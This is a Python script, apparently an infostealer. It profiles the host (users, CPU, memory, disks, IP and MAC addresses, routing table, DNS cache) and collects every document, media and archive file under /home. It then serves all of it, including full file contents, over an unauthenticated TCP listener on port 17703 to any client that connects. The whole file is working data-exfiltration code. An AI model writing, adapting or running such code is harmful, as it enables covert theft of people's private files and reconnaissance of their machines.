import platform, re, uuid, socket, psutil, json, cpuinfo, datetime, subprocess, os

#Getting information about the system
systemInfo = {}
systemInfo['platformInfo'] = {}
try:	
	systemInfo['platformInfo']['boot-time'] = datetime.datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
	systemInfo['platformInfo']['platform'] = platform.system()
	systemInfo['platformInfo']['platform-release'] = platform.release()
	systemInfo['platformInfo']['platform-version'] = platform.version()
	systemInfo['platformInfo']['architecture'] = platform.machine()
	users = psutil.users() 
	i=1
	for user in users:
		systemInfo['platformInfo']['user' +str(i) + "-name"] = user.name 
		i += 1
except: 
	systemInfo['platformInfo']['error'] = "Cannot Recover additional System Information"

#Getting information about the CPU
systemInfo['cpuInfo'] = {}
try:
	systemInfo['cpuInfo']['cpu'] = cpuinfo.get_cpu_info()['brand_raw']
	systemInfo['cpuInfo']['cores'] = psutil.cpu_count(logical = False)
	systemInfo['cpuInfo']['threads'] = psutil.cpu_count()
	systemInfo['cpuInfo']['total-usage'] = str(psutil.cpu_percent()) + "%"
	cpuFreq = psutil.cpu_freq()
	systemInfo['cpuInfo']['max-frequency'] = str(round(cpuFreq.max, 2)) + "MHz"
	systemInfo['cpuInfo']['current-frequency'] = str(round(cpuFreq.current, 2)) + "MHz" 
	systemInfo['cpuInfo']['min-frequency'] = str(round(cpuFreq.min, 2)) + "MHz"
except:
	systemInfo['cpuInfo']['error'] = "Cannot Recover additional CPU Information"

#Getting information about the Memory
systemInfo['memoryInfo'] = {}
try:
	ram=psutil.virtual_memory()
	systemInfo['memoryInfo']['ram-size'] = str(round(ram.total / (1024.0 ** 3), 2)) + "GB"
	systemInfo['memoryInfo']['available'] = str(round(ram.available / (1024.0 ** 3), 2)) + "GB"
	systemInfo['memoryInfo']['used'] = str(round(ram.used / (1024.0 ** 3), 2)) + "GB"
	systemInfo['memoryInfo']['percentage-used'] = str(ram.percent) + "%"
	systemInfo['memoryInfo']['swap-memory'] = str(round(psutil.swap_memory().total / (1024.0 ** 3), 2)) + "GB"
except:
	systemInfo['memoryInfo']['error'] = "Cannot Recover additional Memory Information"

#Getting information about the disks
systemInfo['diskInfo'] = {}
try:
	partitions = psutil.disk_partitions(all = False)
	i = 1
	for partition in partitions:
		partitionUsage = psutil.disk_usage(partition.mountpoint)
		if partitionUsage.free != 0:
			systemInfo['diskInfo']['disk' + str(i) + '-name'] =  partition.device
			systemInfo['diskInfo']['disk' + str(i) + '-mountpoint'] = partition.mountpoint
			systemInfo['diskInfo']['disk' + str(i) + '-filesystem'] = partition.fstype
			systemInfo['diskInfo']['disk' + str(i) + '-totalsize'] = str(round(partitionUsage.total / (1024.0 ** 3), 2)) + "GB"
			systemInfo['diskInfo']['disk' + str(i) + '-free'] = str(round(partitionUsage.free / (1024.0 ** 3), 2)) + "GB"
			i += 1
		else:
			continue
except:
	systemInfo['diskInfo']['error'] = "Cannot recover additional Disks Information"

#Getting information about the network card
systemInfo['networkInfo'] = {}
try:
	systemInfo['networkInfo']['hostname'] = socket.gethostname()
	systemInfo['networkInfo']['ip-address'] = socket.gethostbyname(socket.gethostname())
	systemInfo['networkInfo']['mac-address'] = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
	net_io = psutil.net_io_counters()
	systemInfo['networkInfo']['bytes-sent'] = str(round(net_io.bytes_sent / (1024 ** 2), 2)) + "MB"
	systemInfo['networkInfo']['bytes-received'] = str(round(net_io.bytes_recv / (1024 ** 2), 2)) + "MB"
except:
	systemInfo['networkInfo']['error'] = "Cannot recover additional Network Information"

#Getting information about the battery
systemInfo['batteryInfo'] = {}
try:
	battery = psutil.sensors_battery()
	systemInfo['batteryInfo']['battery'] = "false"
	if battery != None:
		systemInfo['batteryInfo']['battery'] = "true"
		systemInfo['batteryInfo']['charge'] = str(battery.percent) + "%"
		systemInfo['batteryInfo']['plugged'] = str(battery.power_plugged)
except:
	systemInfo['batteryInfo']['error'] = "Cannot recover additional Battery Infomation"
	
#Getting info about RoutingTable and DNS 
if systemInfo['platformInfo']['platform'] == 'Windows':
	rtCommand = subprocess.run(['route', 'print'], stdout = subprocess.PIPE)
	dnsCommand = subprocess.run(['ipconfig', '/displaydns'], stdout = subprocess.PIPE) 
else:
	rtCommand = subprocess.run(['netstat', '-rn'], stdout = subprocess.PIPE)
	dnsCommand = subprocess.run(['systemctl', 'is-active', 'system-resolved'], stdout = subprocess.PIPE)
	
#Saving the output into strings for the send 	
routingTable = rtCommand.stdout
dns = dnsCommand.stdout

#Searching files 
path = r"/home"
filesToSend = [{}]
for root, dirs, files in os.walk(path):
	for x in files:
		if (x.endswith(('.txt','.doc','.docx','.mp4','.pdf','.mp3','.rtf','.jpg','.jpeg','.gif','.mkv','.zip','.rar','.7z','.tar','.ppt','.pptx','.xsl','.xlsx','.ods','.odt'))):
			filesProperties = {}
			filesProperties['path'] = root + "/" + x
			filesProperties['filename'] = x
			filesToSend.append(filesProperties)
filesToSend.pop(0)			
numFiles = len(filesToSend)

#Network variables initialization for connection to the client 
serverPort = 17703
serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serverSocket.bind(('', serverPort))
serverSocket.listen(1)


#Sending information obtained
while True:
	connectionSocket,addr = serverSocket.accept()
	connectionSocket.send(json.dumps(systemInfo, indent = 4).encode())
	connectionSocket.recv(128)
	connectionSocket.send(routingTable)
	connectionSocket.recv(128)
	connectionSocket.send(dns)
	connectionSocket.recv(128)
	
#Sending obtained files 
	connectionSocket.send(str(numFiles).encode())
	connectionSocket.recv(128)
	for i in range(numFiles):
		with open (filesToSend[i]['path'],"rb") as f:
			fileSize = os.path.getsize(filesToSend[i]['path'])
			connectionSocket.send(filesToSend[i]['filename'].encode())
			connectionSocket.recv(128)
			connectionSocket.send(str(fileSize).encode())
			connectionSocket.recv(128)
			data = f.read()
			connectionSocket.sendall(data)
			connectionSocket.send(b"<TMB>") 
			connectionSocket.recv(128)
	connectionSocket.close()
